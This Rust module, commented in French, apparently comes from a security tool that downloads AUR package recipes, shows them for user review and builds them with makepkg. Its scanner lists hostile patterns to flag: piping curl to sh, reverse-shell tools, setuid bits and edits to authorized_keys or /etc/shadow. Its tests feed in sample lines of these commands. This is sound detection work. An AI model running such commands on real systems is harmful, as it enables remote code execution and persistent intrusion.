//! Mise à jour AUR dans l'application : on télécharge la recette (dépôt git de l'AUR) dans un dossier privé,
//! l'utilisateur RELIT le PKGBUILD (et les scripts d'installation) dans l'application, puis on construit
//! EXACTEMENT ce dossier relu avec `makepkg` (aucun second téléchargement de recette : rien ne peut changer entre la relecture et la construction).
//! Aucun shell, programmes par chemin absolu, noms de paquets validés, élévation de droits uniquement par pkexec (fenêtre système).

use crate::tools::Plan;
use crate::util::{PKEXEC, abs_prog};
use std::fs;
use std::io::Read;
use std::os::unix::fs::{DirBuilderExt, OpenOptionsExt};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

const MAX_FILE: u64 = 96 * 1024;
const MAX_FILES: usize = 40;

pub struct Fetched {
    pub name: String,
    pub dir: PathBuf,
    pub version: String,
    pub commit: String,
    /// (nom, contenu) des fichiers texte à relire ; le PKGBUILD en premier.
    pub files: Vec<(String, String)>,
    /// Fichiers non affichables (binaires, trop gros) : leur nom est listé.
    pub others: Vec<String>,
    pub warnings: Vec<String>,
    /// Raison de refus (lien symbolique, fichier absent…) : l'installation est alors impossible.
    pub blocked: Option<String>,
}

pub fn valid_name(n: &str) -> bool {
    !n.is_empty() && n.len() <= 100 && !n.starts_with(['-', '.']) && n.chars().all(|c| c.is_ascii_alphanumeric() || "@._+-".contains(c))
}

/// Dossier de travail privé : ~/.cache/cachy-shield/aur (0700).
pub fn cache_root() -> std::io::Result<PathBuf> {
    let base = crate::util::xdg_dir("XDG_CACHE_HOME", ".cache").ok_or_else(|| std::io::Error::other("pas de dossier de cache"))?;
    let dir = base.join("cachy-shield").join("aur");
    fs::DirBuilder::new().recursive(true).mode(0o700).create(&dir)?;
    Ok(dir)
}

fn unique_dir(root: &Path, name: &str) -> std::io::Result<PathBuf> {
    let nanos = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.subsec_nanos()).unwrap_or(0);
    let d = root.join(format!("{name}-{}-{nanos}", std::process::id()));
    fs::DirBuilder::new().mode(0o700).create(&d)?; // échoue si le nom existe déjà (même lien symbolique)
    Ok(d)
}

/// Arguments git durcis : HTTPS seulement, pas de configuration ni de hooks externes, pas d'invite.
pub fn clone_args(name: &str, dest: &Path) -> Vec<String> {
    let mut v: Vec<String> = ["-c", "protocol.allow=never", "-c", "protocol.https.allow=always", "-c", "core.hooksPath=/dev/null", "-c", "http.lowSpeedLimit=1000", "-c", "http.lowSpeedTime=40", "clone", "--depth", "1", "--no-tags", "--quiet", "--"].iter().map(|s| s.to_string()).collect();
    v.push(format!("https://aur.archlinux.org/{name}.git"));
    v.push(dest.to_string_lossy().into_owned());
    v
}

fn git(args: &[String], cwd: Option<&Path>) -> Result<String, String> {
    let git = abs_prog("git").ok_or("git n'est pas installé")?;
    let mut c = Command::new(git);
    c.args(args).env("GIT_TERMINAL_PROMPT", "0").env("GIT_CONFIG_NOSYSTEM", "1").env("GIT_CONFIG_GLOBAL", "/dev/null").env("LC_ALL", "C").stdin(Stdio::null());
    if let Some(d) = cwd {
        c.current_dir(d);
    }
    let o = c.output().map_err(|e| e.to_string())?;
    if o.status.success() {
        Ok(String::from_utf8_lossy(&o.stdout).trim().to_string())
    } else {
        Err(String::from_utf8_lossy(&o.stderr).lines().last().unwrap_or("échec de git").to_string())
    }
}

/// Télécharge la recette d'un paquet AUR (bloquant : à lancer hors du fil principal) et prépare la relecture.
pub fn fetch(name: &str) -> Result<Fetched, String> {
    if !valid_name(name) {
        return Err(format!("nom de paquet invalide : {name}"));
    }
    let root = cache_root().map_err(|e| e.to_string())?;
    let dir = unique_dir(&root, name).map_err(|e| e.to_string())?;
    let repo = dir.join("pkg");
    if let Err(e) = git(&clone_args(name, &repo), None) {
        let _ = fs::remove_dir_all(&dir);
        return Err(format!("{name} : téléchargement impossible ({e})"));
    }
    let commit = git(&["rev-parse".to_string(), "HEAD".to_string()], Some(&repo)).unwrap_or_default();
    let _ = fs::remove_dir_all(repo.join(".git")); // plus besoin : on construit ce qui a été relu, sans réseau git
    let mut f = Fetched { name: name.into(), dir: repo.clone(), version: String::new(), commit, files: vec![], others: vec![], warnings: vec![], blocked: None };
    let mut names: Vec<String> = match fs::read_dir(&repo) {
        Ok(rd) => rd.filter_map(|e| e.ok()).map(|e| e.file_name().to_string_lossy().into_owned()).collect(),
        Err(e) => return Err(e.to_string()),
    };
    names.sort_by_key(|n| (n != "PKGBUILD", n.ends_with(".install") == false, n.clone()));
    if !names.iter().any(|n| n == "PKGBUILD") {
        f.blocked = Some("ce dépôt ne contient pas de PKGBUILD".into());
    }
    for n in names.into_iter().take(MAX_FILES) {
        let p = repo.join(&n);
        let Ok(md) = fs::symlink_metadata(&p) else { continue };
        if md.file_type().is_symlink() {
            f.blocked = Some(format!("« {n} » est un lien symbolique : refusé par sécurité"));
            continue;
        }
        if !md.is_file() {
            f.others.push(format!("{n}/ (dossier)"));
            continue;
        }
        if md.len() > MAX_FILE {
            f.others.push(format!("{n} ({} Kio, trop gros pour être affiché)", md.len() / 1024));
            continue;
        }
        let mut buf = Vec::new();
        if let Ok(fh) = fs::File::open(&p) {
            let _ = fh.take(MAX_FILE).read_to_end(&mut buf);
        }
        match String::from_utf8(buf) {
            Ok(t) if !t.contains('\0') => f.files.push((n, t)),
            _ => f.others.push(format!("{n} (binaire)")),
        }
    }
    f.version = srcinfo_version(f.files.iter().find(|(n, _)| n == ".SRCINFO").map(|(_, t)| t.as_str()).unwrap_or(""));
    f.warnings = scan(&f.files);
    Ok(f)
}

/// « epoch:pkgver-pkgrel » d'après le .SRCINFO (première occurrence de chaque champ).
pub fn srcinfo_version(s: &str) -> String {
    let get = |k: &str| s.lines().find_map(|l| l.trim().strip_prefix(k).and_then(|r| r.trim_start().strip_prefix('=')).map(|v| v.trim().to_string()));
    let (Some(v), rel) = (get("pkgver"), get("pkgrel")) else { return String::new() };
    let mut out = String::new();
    if let Some(e) = get("epoch").filter(|e| !e.is_empty() && e != "0") {
        out += &format!("{e}:");
    }
    out += &v;
    if let Some(r) = rel {
        out += &format!("-{r}");
    }
    out
}

/// Repères automatiques pour aider la relecture (jamais une garantie : l'utilisateur lit le texte lui-même).
pub fn scan(files: &[(String, String)]) -> Vec<String> {
    let mut w: Vec<String> = Vec::new();
    let mut add = |m: &str| {
        if !w.iter().any(|x| x == m) {
            w.push(m.to_string());
        }
    };
    for (name, text) in files {
        if name == ".SRCINFO" || [".patch", ".diff", ".html", ".txt", ".md", ".desktop", ".svg", ".xml", ".json"].iter().any(|e| name.ends_with(e)) {
            continue;
        }
        for raw in text.lines() {
            let l = raw.trim();
            if l.starts_with('#') {
                continue;
            }
            let pipes_to_shell = l.contains('|') && (l.contains("| sh") || l.contains("|sh") || l.contains("| bash") || l.contains("|bash") || l.contains("| sudo") || l.contains("| zsh"));
            if (l.contains("curl") || l.contains("wget")) && pipes_to_shell {
                add("⚠ télécharge puis exécute un script (curl/wget vers sh) dans le PKGBUILD");
            } else if l.contains("curl ") || l.contains("wget ") {
                add("télécharge des fichiers pendant la construction (curl/wget) : vérifiez d'où ils viennent");
            }
            if l.contains("base64") {
                add("⚠ contient du contenu encodé (base64)");
            }
            if l.starts_with("eval ") || l.contains(" eval ") || l.contains("$(eval") {
                add("⚠ utilise « eval »");
            }
            if l.contains("/dev/tcp") || l.contains("nc -e") || l.contains("ncat ") || l.contains("socat ") {
                add("⚠ ouvre une connexion réseau brute");
            }
            if l.contains("chmod") && (l.contains("+s") || l.contains("4755") || l.contains("6755") || l.contains("u+s")) {
                add("⚠ active le bit setuid/setgid");
            }
            if l.contains("systemctl enable") || l.contains("systemctl start") || l.contains("systemctl --now") {
                add("active ou démarre un service système");
            }
            if l.contains("/etc/cron") {
                add("installe une tâche planifiée (cron) : vérifiez ce qu'elle exécute");
            }
            for s in ["crontab", "authorized_keys", ".ssh/", ".bashrc", ".zshrc", ".profile", "/etc/sudoers", "ld.so.preload", "/etc/pam.d", "/etc/shadow", "/etc/passwd"] {
                if l.contains(s) {
                    add(&format!("⚠ touche un fichier sensible ({s})"));
                }
            }
            if l.contains("useradd") || l.contains("usermod") || l.contains("visudo") {
                add("modifie des comptes ou des droits utilisateur");
            }
            if l.contains("http://") && !l.starts_with("url=") && !l.to_lowercase().contains("licen") {
                add("utilise une adresse non chiffrée (http://)");
            }
            if l.contains("'SKIP'") || l.contains("\"SKIP\"") {
                add("l'intégrité d'au moins une source n'est pas vérifiée (SKIP)");
            }
        }
    }
    w
}

/// Fichier de configuration de makepkg : celui du système + pkexec pour les droits administrateur (fenêtre système, jamais de mot de passe dans l'application).
pub fn write_makepkg_conf(dir: &Path) -> std::io::Result<PathBuf> {
    use std::io::Write;
    let p = dir.join("makepkg.conf");
    let mut f = fs::OpenOptions::new().write(true).create_new(true).mode(0o600).open(&p)?;
    write!(f, ". /etc/makepkg.conf\nPACMAN_AUTH=({PKEXEC})\n")?;
    Ok(p)
}

/// Construction et installation du dossier relu. Sans shell : /usr/bin/env fixe la variable, makepkg fait le reste.
pub fn build_plan(conf: &Path) -> Result<Plan, String> {
    let env = abs_prog("env").ok_or("« env » introuvable")?;
    let mk = abs_prog("makepkg").ok_or("makepkg introuvable (paquet base-devel)")?;
    Ok(Plan {
        argv: vec![env.to_string_lossy().into_owned(), format!("MAKEPKG_CONF={}", conf.display()), mk.to_string_lossy().into_owned(), "--syncdeps".into(), "--install".into(), "--needed".into(), "--noconfirm".into(), "--nocolor".into()],
        elevated: false,
        out_flag: None,
        out_pos: 0,
    })
}

/// Avancement approximatif de la construction d'un paquet (0.0–1.0) d'après les jalons de makepkg.
pub fn makepkg_stage(line: &str) -> Option<f64> {
    let l = line.trim_start_matches([' ', '=', '>']).trim();
    [("Retrieving sources", 0.10), ("Extracting sources", 0.20), ("Starting prepare", 0.30), ("Starting build", 0.45), ("Starting check", 0.60), ("Starting package", 0.75), ("Creating package", 0.85), ("Installing", 0.92)]
        .iter()
        .find(|(k, _)| l.starts_with(k))
        .map(|(_, f)| *f)
}

/// Supprime le dossier de travail (et la configuration) d'un paquet.
pub fn cleanup(f: &Fetched) {
    if let Some(parent) = f.dir.parent() {
        if parent.parent().map(|g| g.ends_with("cachy-shield/aur")).unwrap_or(false) {
            let _ = fs::remove_dir_all(parent);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn noms_valides() {
        for ok in ["example-browser", "example-bin", "a+b", "python-x_y.z"] {
            assert!(valid_name(ok), "{ok}");
        }
        for bad in ["", "-x", ".hidden", "a b", "a/b", "a;b", "$(x)", "a\nb", "../x"] {
            assert!(!valid_name(bad), "{bad:?}");
        }
    }

    #[test]
    fn git_durci() {
        let a = clone_args("foo", Path::new("/tmp/x/pkg"));
        assert!(a.windows(2).any(|w| w == ["-c", "protocol.allow=never"]));
        assert!(a.contains(&"core.hooksPath=/dev/null".to_string()));
        assert_eq!(a[a.len() - 2], "https://aur.archlinux.org/foo.git");
        assert!(a.iter().position(|x| x == "--").unwrap() < a.len() - 2, "« -- » avant l'adresse");
    }

    #[test]
    fn version_srcinfo() {
        assert_eq!(srcinfo_version("pkgbase = x\n\tpkgver = 1.2.3\n\tpkgrel = 2\n"), "1.2.3-2");
        assert_eq!(srcinfo_version("pkgver = 5\npkgrel = 1\nepoch = 1\n"), "1:5-1");
        assert_eq!(srcinfo_version(""), "");
    }

    #[test]
    fn reperes() {
        let f = |t: &str| scan(&[("PKGBUILD".into(), t.into())]);
        assert!(f("curl -s http://x | sh").iter().any(|m| m.contains("exécute un script")));
        assert!(f("echo aGk= | base64 -d").iter().any(|m| m.contains("base64")));
        assert!(f("chmod u+s /usr/bin/x").iter().any(|m| m.contains("setuid")));
        assert!(f("echo k >> ~/.ssh/authorized_keys").iter().any(|m| m.contains("sensible")));
        assert!(f("sha256sums=('SKIP')").iter().any(|m| m.contains("SKIP")));
        assert!(f("# curl x | sh\npkgname=a\nsha256sums=('abc')").is_empty(), "commentaires ignorés, PKGBUILD banal sans repère");
        assert!(scan(&[("a.patch".into(), "curl x | sh".into())]).is_empty(), "les correctifs .patch ne sont pas des scripts");
    }

    #[test]
    fn jalons_makepkg() {
        assert_eq!(makepkg_stage("==> Starting build()..."), Some(0.45));
        assert_eq!(makepkg_stage("==> Retrieving sources..."), Some(0.10));
        assert_eq!(makepkg_stage("hello"), None);
    }

    #[test]
    fn conf_makepkg_privee() {
        let d = std::env::temp_dir().join(format!("cs-aur-test-{}", std::process::id()));
        fs::create_dir_all(&d).unwrap();
        let p = write_makepkg_conf(&d).unwrap();
        let t = fs::read_to_string(&p).unwrap();
        assert!(t.contains("PACMAN_AUTH=(/usr/bin/pkexec)") && t.contains(". /etc/makepkg.conf"));
        assert!(write_makepkg_conf(&d).is_err(), "jamais d'écrasement d'un fichier existant");
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(fs::metadata(&p).unwrap().permissions().mode() & 0o777, 0o600);
        let _ = fs::remove_dir_all(&d);
    }

    #[test]
    fn plan_sans_shell_ni_elevation_directe() {
        if let Ok(p) = build_plan(Path::new("/x/makepkg.conf")) {
            assert!(!p.elevated, "makepkg refuse root : il tourne en utilisateur et demande pkexec lui-même");
            assert!(p.argv.iter().any(|a| a == "MAKEPKG_CONF=/x/makepkg.conf"));
            assert!(!p.argv.iter().any(|a| a == "-c" || a.ends_with("/sh") || a.ends_with("/bash")));
        }
    }
}

#[cfg(test)]
mod tests_reseau {
    use super::*;

    /// Test réel (réseau) : `cargo test -- --ignored fetch_reel`. Télécharge une recette AUR, vérifie relecture et nettoyage ; n'installe rien.
    #[test]
    #[ignore]
    fn fetch_reel() {
        let f = fetch("yay").expect("téléchargement");
        assert!(f.blocked.is_none(), "{:?}", f.blocked);
        assert_eq!(f.files[0].0, "PKGBUILD");
        assert!(!f.version.is_empty() && f.commit.len() >= 7, "version {:?} commit {:?}", f.version, f.commit);
        assert!(!f.dir.join(".git").exists(), ".git retiré : on construit ce qui a été relu");
        println!("version={} commit={} avertissements={:?} autres={:?}", f.version, f.commit, f.warnings, f.others);
        cleanup(&f);
        assert!(!f.dir.exists());
        let inexistant = fetch("nom-inexistant-zzzz-12345");
        assert!(inexistant.is_err() || inexistant.map(|f| f.blocked.is_some()).unwrap_or(false), "un paquet inexistant n'est jamais installable");
    }
}
